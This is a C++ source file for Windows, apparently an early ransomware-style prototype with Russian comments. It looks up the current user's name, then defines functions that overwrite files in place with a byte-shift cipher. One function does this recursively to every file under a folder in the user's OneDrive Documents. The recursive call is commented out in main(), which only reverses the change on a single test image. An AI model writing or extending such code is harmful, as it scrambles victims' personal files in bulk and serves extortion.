#include <Windows.h>
#include <fstream>
#include <iostream>
#include <filesystem>
#include <lmcons.h> // Для UNLEN
#pragma warning(disable : 4996)

using namespace std;

void cryptFile(const string filePath) {

    //Открываем и считываем размер файлa
    FILE* file = fopen(filePath.c_str(), "rb");
    if (file == NULL) {
        cout << "couldn't open file" << endl;
        return;
    }
    fseek(file, 0, SEEK_END);
    long int size = ftell(file);
    fclose(file);

    // код шифрования, мы будем просто вычитать 0x11
    file = fopen(filePath.c_str(), "rb");
    unsigned char* in = (unsigned char*)malloc(size);
    int bytes_read = fread(in, sizeof(unsigned char), size, file);
    fclose(file);

    for (int i = 0; i < size; i++) {
        in[i] = in[i] - 0x11;
    }

    //Ну и наконец, выписываем наш зашифрованный код в новый файл:
    //string crypt_filename = "crypt_" + filePath;

    file = fopen(filePath.c_str(), "wb");
    if (file == NULL) {
        cout << "couldn't open file" << endl;
        return;
    }
    int bytes_written = fwrite(in, sizeof(unsigned char), size, file);
    fclose(file);

    //Удаляем изначальный файл

   // if (std::remove(filePath.c_str()) != 0) {
   //     cout << "Не удалось удалить файл: " << std::endl;
   // }
    //else {}
}
void decryptFile(const string filePath) {

    //Открываем и считываем размер файла
    FILE* file = fopen(filePath.c_str(), "rb");
    if (file == NULL) {
        cout << "couldn't open file" << endl;
        return;
    }
    fseek(file, 0, SEEK_END);
    long int size = ftell(file);
    fclose(file);

    // код дешифрования
    file = fopen(filePath.c_str(), "rb");
    unsigned char* in = (unsigned char*)malloc(size);
    int bytes_read = fread(in, sizeof(unsigned char), size, file);
    fclose(file);

    for (int i = 0; i < size; i++) {
        in[i] = in[i] + 0x11;
    }

    //string decrypt = "de" + filePath;

    file = fopen(filePath.c_str(), "wb");
    if (file == NULL) {
        cout << "couldn't open file" << endl;
        return;
    }
    int bytes_written = fwrite(in, sizeof(unsigned char), size, file);
    fclose(file);

    //Удаляем изначальный файл
   // if (std::remove(filename.c_str()) != 0) {
   //     // cout << "Не удалось удалить файл: " << fileToDelete << std::endl;
   // }
   // else {}
}
// Функция для рекурсивного шифрования файлов в указанной директории
void encryptFilesInDirectory(const std::string& directoryPath) {
    for (const auto& entry : filesystem::recursive_directory_iterator(directoryPath)) {
        if (filesystem::is_regular_file(entry.path())) {
            cryptFile(entry.path().string());
            entry.path().string().clear();
        }
    }
}

int main()
{
    string username;
    DWORD size = UNLEN + 1;

    username.resize(size);

    if (GetUserNameA(&username[0], &size)) {
        username.resize(size - 1); // убираем завершающий нулевой символ
    }
    else {
        cout << "Не удалось получить информацию о пользователе." << endl;
    }

    string Directory = "C:\\Users\\" + username + "\\OneDrive\\Documents\\testFolder\\SteamVostanovlenie.jpg";
    decryptFile(Directory);
    //encryptFilesInDirectory(Directory);
}